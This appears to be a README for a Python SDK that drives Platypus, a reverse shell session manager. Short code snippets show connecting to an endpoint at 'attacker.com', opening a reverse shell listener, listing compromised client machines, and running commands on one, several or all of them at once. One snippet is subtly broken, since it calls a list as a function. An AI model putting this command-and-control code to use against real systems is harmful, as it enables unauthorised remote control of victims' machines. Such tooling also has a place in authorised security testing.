# Platypus-Python

Python SDK for reverse shell sessions manager [Platypus](https://github.com/WangYihang/Platypus)

## Install

```bash
pip install platypus-python
```

## Usage

### Connect to Platypus endpoint
```python
import platypus_python as pp

p = pp.Platypus("attacker.com", 7331)
```

### Create a reverse shell server

```python
server = p.create_server("0.0.0.0", 13339)
```

### Get all available listening servers

```python
servers = p.get_servers()
for server in servers():
    print(server)
```

### Stop a reverse shell server

```python
server = servers[0]
server.delete()
```

### Get all online Clients of a server

```python
server = servers[0]
clients = server.get_clients()
for client in clients:
    print(client)
```

### Execute a command on a client

```python
client = clients[0]
client.system("id")
```

### Execute a command on all clients of a server

```python
server = servers[0]
server.system("id")
```

### Execute a command on all clients

```python
p.system("id")
```